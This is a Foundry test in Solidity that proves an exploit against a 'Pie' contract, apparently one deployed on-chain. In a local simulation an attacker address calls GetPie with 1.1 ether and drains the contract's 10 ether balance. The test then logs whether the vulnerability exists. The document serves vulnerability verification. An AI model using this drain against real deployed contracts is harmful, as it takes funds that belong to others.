// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x806a6bd219f162442d992bdc4ee6eba1f2c5a707.sol";

contract PieTest is Test {
    Pie public pie;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy the Pie contract
        vm.prank(owner);
        pie = new Pie();
        
        // Fund the contract with 10 Ether
        vm.deal(address(pie), 10 ether);
    }

    function test_GetPie_DrainsContract() public {
        // BEFORE-Trigger: Contract balance
        uint256 initialContractBalance = address(pie).balance;
        assertEq(initialContractBalance, 10 ether, "Contract must be initialized with 10 ether");
        console.log("--- BEFORE-Trigger Contract Balance ---");
        console.log("Contract balance: %s ETH", initialContractBalance/1e18);
        console.log("");

        console.log("--- Trigger GetPie ---");
        console.log("Executing attacker.GetPie{value: 1.1 ether}()...");
        
        // Prepare attacker with enough Ether to call GetPie
        vm.deal(attacker, 1.1 ether);

        // Execute attack
        vm.prank(attacker);
        pie.GetPie{value: 1.1 ether}();

        // AFTER-Trigger: Contract balance
        console.log("");
        console.log("--- AFTER-Trigger Contract Balance ---");
        uint256 finalContractBalance = address(pie).balance;
        console.log("Contract balance: %s ETH", finalContractBalance/1e18);
        console.log("");

        // Verdict based on balance comparison
        console.log("--- Vulnerability Verification ---");
        if (finalContractBalance == 0) {
            console.log("Vulnerability Exists: Contract ETH balance fully drained to 0");
        } else {
            console.log("Vulnerability not Exist: Unexpected contract balance %s ETH", finalContractBalance/1e18);
        }
        
        // Original verification check is preserved
        assertEq(finalContractBalance, 0, "Contract balance should be 0 after draining");
    }
}